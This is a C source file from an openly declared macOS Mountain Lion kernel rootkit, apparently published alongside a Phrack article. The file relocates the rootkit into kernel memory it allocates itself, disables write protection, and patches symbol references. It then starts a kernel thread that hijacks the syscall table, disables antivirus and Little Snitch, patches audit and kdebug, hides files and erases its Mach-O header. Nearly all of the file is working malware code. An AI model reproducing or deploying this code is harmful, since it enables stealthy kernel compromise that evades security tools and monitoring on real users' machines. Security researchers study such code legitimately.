/*
 *   _____   _                          ___     _      _  _     _              __ _
 *  |_   _| | |_      ___      o O O   | __|   | |    | || |   (_)    _ _     / _` |
 *    | |   | ' \    / -_)    o        | _|    | |     \_, |   | |   | ' \    \__, |
 *   _|_|_  |_||_|   \___|   TS__[O]  _|_|_   _|_|_   _|__/   _|_|_  |_||_|   |___/
 * _|"""""|_|"""""|_|"""""| {======|_| """ |_|"""""|_| """"|_|"""""|_|"""""|_|"""""|
 * "`-0-0-'"`-0-0-'"`-0-0-'./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *            ___      _
 *    o O O  / __|    (_)      _ _    __     _  _     ___
 *   o      | (__     | |     | '_|  / _|   | +| |   (_-<
 *  TS__[O]  \___|   _|_|_   _|_|_   \__|_   \_,_|   /__/_
 *  {======|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|_|"""""|
 * ./o--000'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'
 *
 * And now for something completely different...
 *
 * A Mountain Lion rootkit for Phrack #69!
 *
 * Copyright (c) fG!, 2012, 2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * zombies.c
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#include "zombies.h"

#include <sys/param.h>
#include <sys/malloc.h>
#include <sys/dirent.h>
#include <mach-o/loader.h>
#include <sys/kdebug.h>
#include <kern/thread.h>

#include "kernel_info.h"
#include "cpu_protections.h"
#include "configuration.h"
#include "my_data_definitions.h"
#include "hijacking_utils.h"
#include "utlist.h"
#include "kernel_info.h"
#include "disasm_utils.h"
#include "hash_utils.h"
#include "function_pointers.h"
#include "disasm_utils.h"
#include "kdebug.h"
#include "audit.h"
#include "sysent.h"
#include "hide_files.h"
#include "clean_tracks.h"
#include "anti_littlesnitch.h"
#include "av_monster_II.h"
#include "ioctl.h"
#include "exec_userland_cmd.h"
#include "proc_utils.h"

extern struct kernel_info g_kernel_info;

// prototypes
static mach_vm_address_t find_rootkit_base(const mach_vm_address_t start_address);
static uint64_t find_rootkit_size(const mach_vm_address_t header_addr);
static void fix_zombie_symbols(const mach_vm_address_t rootkit_base, const mach_vm_address_t zombie_base);
// the zombie thread responsible to install the rootkit features
void wake_the_zombie(void *parameter, wait_result_t x);

#define task_lock(task)		lck_mtx_lock(&(task)->lock)
#define task_unlock(task)	lck_mtx_unlock(&(task)->lock)

#pragma mark The start and stop functions

kern_return_t
unleash_the_zombie(void)
{
    // allocate memory for the rootkit
    // 1-we need to find its total size
    // kmod list is useless because of ASLR
    mach_vm_address_t myself = (mach_vm_address_t)&unleash_the_zombie;
    // find the rootkit base address
    mach_vm_address_t rootkit_base = find_rootkit_base(myself);
    if (rootkit_base == 0) return KERN_FAILURE;
    // calculate rootkit size in memory
    uint64_t rootkit_size = find_rootkit_size(rootkit_base);
    // 2-compute the distance to the function that will resume execution in the new area
    mach_vm_address_t next_function = (mach_vm_address_t)&wake_the_zombie;
    int64_t wakeup_distance = (mach_vm_address_t)&wake_the_zombie - rootkit_base;
    // 3-allocate rootkit memory
    char *zombie_mem = _MALLOC(rootkit_size, M_TEMP, M_WAITOK);
    if (zombie_mem == NULL)
    {
#if DEBUG
        //moony_modify//printf("[ERROR] Zombie memory allocation failed!\n");
#endif
        return KERN_FAILURE;
    }
#if DEBUG
    //moony_modify//printf("[DEBUG] myself located at: %p\n", (void*)myself);
    //moony_modify//printf("[DEBUG] rootkit_base at: %p\n", (void*)rootkit_base);
    //moony_modify//printf("[DEBUG] wake the zombie at: %p\n", (void*)next_function);
    //moony_modify//printf("[DEBUG] zombie rootkit to be located at: %p distance to wake up: 0x%llx\n", (void*)zombie_mem, wakeup_distance);
#endif
    // 4-copy rootkit into the new memory area
    disable_interrupts();
    disable_wp();
    memcpy((void*)zombie_mem, (void*)rootkit_base, rootkit_size);
    // and change memory protection to executable
    if (_mach_vm_protect == NULL) _mach_vm_protect = (void*)solve_kernel_symbol(&g_kernel_info, "_mach_vm_protect");

    struct proc *p_kernel = proc_find(0);
    struct task *kernel_task = (struct task*)(p_kernel->task);
    task_lock(kernel_task);
    vm_prot_t new_prot = VM_PROT_EXECUTE | VM_PROT_READ;
    kern_return_t kr = _mach_vm_protect((vm_map_t)kernel_task->map, (mach_vm_address_t)zombie_mem, rootkit_size, FALSE, new_prot);
    if (kr != KERN_SUCCESS)
    {
#if DEBUG
        //moony_modify//printf("[ERROR] Houston we have a problem with our zombies!\n");
#endif
        return KERN_FAILURE;
    }
    task_unlock(kernel_task);
    proc_rele(p_kernel);
    enable_wp();
    enable_interrupts();
    // 5-we need to find a way to jump into the rootkit
    //   because this function must return, we can't simply jmp into the zombie area
    //   one idea is to hook some kernel function and let it resume there
    //   then restore original opcodes and continue the rootkit
    // we should return KERN_FAILURE and that solves the main kext problem - no need to unload it
    void (*thread_startup)(void *parameter, wait_result_t x) = (void*)(zombie_mem + wakeup_distance);
#if DEBUG
    //moony_modify//printf("[DEBUG] Thread startup pointer to: %p (0x%llx)\n", thread_startup, (mach_vm_address_t)zombie_mem + wakeup_distance);
#endif
    // fix the external symbols inside the zombie rootkit
    fix_zombie_symbols(rootkit_base, (mach_vm_address_t)zombie_mem);
    // fix the linkedit buffer in g_kernel_info to the zombie version
    // XXX: we really don't need this; we could leave it leaked and free it later since we still have control over those pointers
    int64_t kernel_info_distance = (mach_vm_address_t)&g_kernel_info - rootkit_base;
#if DEBUG
    //moony_modify//printf("[DEBUG] g_kernel_info distance is %llx\n", kernel_info_distance);
#endif
    struct kernel_info *zombie_kernel_info = (struct kernel_info*)((mach_vm_address_t)zombie_mem + kernel_info_distance);
    zombie_kernel_info->linkedit_buf = _MALLOC(zombie_kernel_info->linkedit_size, M_TEMP, M_ZERO);
    if (zombie_kernel_info->linkedit_buf == NULL)
    {
#if DEBUG
        //moony_modify//printf("[ERROR] Failed to allocate memory for zombie linkedit!\n");
#endif
        return KERN_FAILURE;
    }
    // copy from old buffer
    disable_interrupts();
    disable_wp();
    memcpy((void*)zombie_kernel_info->linkedit_buf, (void*)g_kernel_info.linkedit_buf, g_kernel_info.linkedit_size);
    enable_wp();
    enable_interrupts();
    // free old buffer
    bzero(g_kernel_info.linkedit_buf, g_kernel_info.linkedit_size);
    _FREE(g_kernel_info.linkedit_buf, M_TEMP);
    // and finally create the new kernel thread and launch the zombie rootkit
    thread_t zombie_thread;
    kernel_thread_start(thread_startup, NULL, &zombie_thread);
    thread_deallocate(zombie_thread);

    return KERN_SUCCESS;
}

/*
 * the zombie thread entrypoint that we use to install rootkit hooks and wahtever else we want
 */
void
wake_the_zombie(void *parameter, wait_result_t x)
{
#if DEBUG
    //moony_modify//printf("I'm the zombie, gimme brainnssss!\n");
#endif
    // now we activate the rootkit features as in start function
#if KDEBUG_MODE > 0
    patch_kdebug_internal();
#endif
    
#if AVMONSTER_MODE > 0
    unleash_the_monster();
#endif
    // add communication channels - we don't need two at the same time
#if DEVICE_MODE > 0
    install_rootkit_device();
#elif KCONTROL_MODE > 0
    install_kern_control();
#endif
    
#if EXECCMD_MODE > 0
    execute_user_command();
#endif
    
#if HIJACKSYSENT_MODE == 1
    hijack_sysent_table();
#elif HIJACKSYSENT_MODE == 2
    hijack_sysent_ptr();
#endif

#if ANTILITTLESNICH_MODE == 1
    kill_the_snitch();
#endif
    
#if AUDIT_MODE == 1
    patch_audit_commit();
#endif

#if NUKEHEADERS_MODE == 1
    nuke_mach_header();
#endif
    
#if DEBUG
    add_file_to_hide("/mach_kernel");
    add_file_to_hide("/Volumes/");
#endif
    // XXX: this is a lame solution to the following problem
    // the OSXKextLog is disabled before entering unleash_the_zombie()
    // that function spawns a new kernel thread which will continue the zombie
    // the problem is to sync the zombie thread with the main kext thread that
    // will return failure
    // we can only restore the OSKextLog after kextload exits with error
    // this solution loops as long kextload process still exists
    // when it finally exits, we restore the OSKextLog function
    while (find_proc_by_name("kextload") != (proc_t)0)
    {
        ;
    }
    // restore logging features
    enable_oskextlog();
    enable_kextd_syslog();
}


#pragma mark Auxiliary functions

/*
 * this function will fix all symbol references in the zombie rootkit memory
 * it does this by finding the kernel symbol address
 * then finding all xrefs in the original rootkit code
 * and fixing the references in the zombie
 */
static void
fix_zombie_symbols(const mach_vm_address_t rootkit_base, const mach_vm_address_t zombie_base)
{
    // I feel lazy, let's go with a hardcoded symbols list
    /*
     for i in `nm -u  the_flying_circus`; do /bin/echo -n \"$i\",; done ; echo NULL
     */
    const char *symbols_list[] = { "_VNOP_READ","__FREE","__MALLOC","___stack_chk_fail","___stack_chk_guard","_bcopy","_bzero","_cdevsw_add","_cdevsw_remove","_copyin","_copyout","_ctl_deregister","_ctl_enqueuedata","_ctl_register","_current_proc","_devfs_make_node","_devfs_remove","_enodev","_enodev_strat","_kernel_thread_start","_lck_mtx_lock","_lck_mtx_unlock","_memcmp","_memcpy","_memset","_nulldev","_printf","_proc_find","_proc_name","_proc_rele","_proc_self","_strcmp","_strlcpy","_strlen","_strncmp","_thread_deallocate","_uio_addiov","_uio_create","_uio_resid","_vn_getpath","_vnode_lookup","_vnode_put",NULL};
    const char **n;
    for (n = symbols_list; *n != NULL ; n++)
    {
        mach_vm_address_t symb_addr = solve_kernel_symbol(&g_kernel_info, (char*)*n);
        struct xrefs *symbol_xrefs = NULL;
        find_kext_symbol_refs(rootkit_base, (char*)*n, &symbol_xrefs);

        struct xrefs *el;
        disable_interrupts();
        disable_wp();
        LL_FOREACH(symbol_xrefs, el)
        {
            // compute the distance between the xref and the rootkit base address
            // we use this distance to update the zombie memory since it's the same distance
            int32_t distance = (int32_t)(el->address - rootkit_base);
            mach_vm_address_t zombie_address = zombie_base + distance;
#if DEBUG
//            //moony_modify//printf("[DEBUG] zombie address is %p %p %x\n", (void*)zombie_address, (void*)(zombie_address-zombie_base), *(unsigned char*)zombie_address);
#endif
            int32_t new_offset = (int32_t)(symb_addr - zombie_address - el->size);
            // the offset portion of the call/jmp to fix
            mach_vm_address_t patch_offset_adr = zombie_address + 1;
            memcpy((void*)patch_offset_adr, &new_offset, sizeof(int32_t));
        }
        enable_wp();
        enable_interrupts();
        // cleanup xrefs
        struct xrefs *tmp;
        LL_FOREACH_SAFE(symbol_xrefs, el, tmp)
        {
            LL_DELETE(symbol_xrefs, el);
            _FREE(el, M_TEMP);
        }
    }
}

/*
 * find the rootkit base address (mach-o header)
 * by searching backwards using a rootkit function address as starting point
 */
static mach_vm_address_t
find_rootkit_base(const mach_vm_address_t start_address)
{
#if DEBUG_FUNCTIONS
    START
#endif
    mach_vm_address_t temp_address = start_address;
    struct segment_command_64 *segment_command = NULL;
    while (temp_address > 0)
    {
        if (*(uint32_t*)temp_address == MH_MAGIC_64)
        {
            // XXX: we could do additional validation on the segment command
            segment_command = (struct segment_command_64*)(temp_address+sizeof(struct mach_header_64));
            if (strncmp(segment_command->segname, "__TEXT", 16) == 0)
            {
#if DEBUG
                //moony_modify//printf("[DEBUG] Found rootkit mach-o header address at %p\n", (void*)(temp_address));
#endif
                return temp_address;
            }
        }
        if (temp_address - 1 > temp_address) break;
        temp_address--;
    }    
#if DEBUG_FUNCTIONS
    END
#endif
    return 0;
}

/*
 * __LINKEDIT is not loaded into kernel memory so we just need to sum __TEXT and __DATA segments size
 */
static uint64_t
find_rootkit_size(const mach_vm_address_t header_addr)
{
    uint64_t rootkit_size = 0;
    struct mach_header_64 *mh = (struct mach_header_64*)header_addr;
    if (mh->magic != MH_MAGIC_64) return 0;

    struct load_command *load_cmd = NULL;
    char *load_cmd_addr = (char*)header_addr + sizeof(struct mach_header_64);
    for (uint32_t i = 0; i < mh->ncmds; i++)
    {
        load_cmd = (struct load_command*)load_cmd_addr;
        if (load_cmd->cmd == LC_SEGMENT_64)
        {
            struct segment_command_64 *seg_cmd = (struct segment_command_64*)load_cmd;
            // XXX: these strings should be obfuscated ;-)
            if (strncmp(seg_cmd->segname, "__TEXT", 16) == 0)
            {
                rootkit_size += seg_cmd->vmsize;
            }
            else if (strncmp(seg_cmd->segname, "__DATA", 16) == 0)
            {
                rootkit_size += seg_cmd->vmsize;
            }
        }
        load_cmd_addr += load_cmd->cmdsize;
    }
    return rootkit_size;
}

